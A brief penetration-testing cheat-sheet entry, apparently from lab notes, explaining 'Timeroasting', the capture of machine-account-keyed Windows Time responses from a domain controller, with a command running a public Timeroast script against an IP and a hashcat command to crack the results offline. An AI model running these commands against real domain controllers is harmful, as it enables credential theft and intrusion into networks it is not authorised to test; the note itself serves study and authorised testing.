# Timeroasting

A technique that abuses the Microsoft SNTP/Windows Time service: when a client requests time, the DC responds with a blob signed/HMAC’d using a machine account key. That blob can be captured and cracked offline to recover the machine account password (or key material). Not the same as standard NTLM/AS-REP, but same offline-crack idea.

***

**Exploit**

[github.com/SecuraBV/Timeroast](https://github.com/SecuraBV/Timeroast.git)

```bash
python timeroast.py 10.10.11.75
```

**Crack hashes**

```bash
hashcat -m 31100 hashes.txt /usr/share/wordlists/rockyou.txt
```
